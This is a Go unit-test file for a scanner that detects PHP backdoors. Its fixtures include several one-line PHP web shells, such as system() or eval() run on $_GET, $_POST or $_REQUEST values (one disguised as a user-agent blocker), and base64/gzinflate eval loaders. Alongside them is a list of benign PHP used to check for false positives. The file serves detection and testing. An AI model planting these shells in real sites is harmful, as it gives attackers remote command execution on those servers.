package main

import "testing"

// kindsOf collapses a hit list to the set of kinds seen, for terse assertions.
func kindsOf(hits []BackdoorHit) map[string]int {
	m := make(map[string]int)
	for _, h := range hits {
		m[h.Kind]++
	}
	return m
}

func TestScanBackdoors_Detects(t *testing.T) {
	cases := []struct {
		name    string
		content string
		kind    string
	}{
		{
			// The motivating example: RCE disguised as a bot-blocker.
			name:    "disguised useragent shell",
			content: `<?php if(isset($_GET['useragent'])){echo"deny_agent";system($_GET['useragent']);exit;}`,
			kind:    "rce_sink_superglobal",
		},
		{
			name:    "eval post",
			content: `<?php @eval($_POST['code']);`,
			kind:    "rce_sink_superglobal",
		},
		{
			name:    "assert request",
			content: `<?php assert($_REQUEST['x']);`,
			kind:    "rce_sink_superglobal",
		},
		{
			name:    "dynamic call off request",
			content: `<?php $_REQUEST['f']($_REQUEST['a']);`,
			kind:    "dynamic_call_superglobal",
		},
		{
			name:    "obfuscated eval loader",
			content: `<?php eval(base64_decode("ZWNobyAxOw=="));`,
			kind:    "eval_obfuscated",
		},
		{
			name:    "gzinflate loader",
			content: `<?php eval(gzinflate(base64_decode($payload)));`,
			kind:    "eval_obfuscated",
		},
		{
			name:    "preg_replace /e",
			content: `<?php preg_replace("/.*/e", $_GET['c'], "");`,
			kind:    "preg_replace_e",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			a := newAnalyzer(nil)
			a.scanBackdoors("shell.php", []byte(tc.content))
			hits := finaliseBackdoors(a)
			if len(hits) == 0 {
				t.Fatalf("expected a backdoor hit, got none")
			}
			if kindsOf(hits)[tc.kind] == 0 {
				t.Fatalf("expected kind %q, got %v", tc.kind, kindsOf(hits))
			}
			if hits[0].File != "shell.php" || hits[0].Line < 1 {
				t.Fatalf("bad location: file=%q line=%d", hits[0].File, hits[0].Line)
			}
		})
	}
}

func TestScanBackdoors_NoFalsePositives(t *testing.T) {
	benign := []string{
		// Sinks with literal/constant args — normal kit/library code.
		`<?php system("/usr/bin/convert -resize 100x100 a.png b.png");`,
		`<?php $out = shell_exec("git rev-parse HEAD");`,
		`<?php exec("ls -la", $lines);`,
		// Superglobal used, but not into a dangerous sink.
		`<?php $name = htmlspecialchars($_GET['name']); echo $name;`,
		`<?php if (isset($_POST['email'])) { mail($to, $subj, $body); }`,
		// preg_replace without the /e modifier.
		`<?php $s = preg_replace("/\s+/", " ", $input);`,
		// Function names that merely contain a sink substring.
		`<?php pg_exec($conn, "SELECT 1"); $x = my_system_check();`,
	}
	for _, src := range benign {
		a := newAnalyzer(nil)
		a.scanBackdoors("x.php", []byte(src))
		if hits := finaliseBackdoors(a); len(hits) != 0 {
			t.Errorf("false positive on %q: %+v", src, hits)
		}
	}
}

func TestScanBackdoors_DedupAndCap(t *testing.T) {
	// Same callsite repeated across many lines should dedupe per line but
	// still be capped; identical line/kind on one line counts once.
	a := newAnalyzer(nil)
	a.scanBackdoors("dup.php", []byte("<?php system($_GET['c']); system($_GET['c']);"))
	hits := finaliseBackdoors(a)
	// Both matches are on line 1, same kind -> one hit after dedup.
	if len(hits) != 1 {
		t.Fatalf("expected 1 deduped hit, got %d: %+v", len(hits), hits)
	}
}
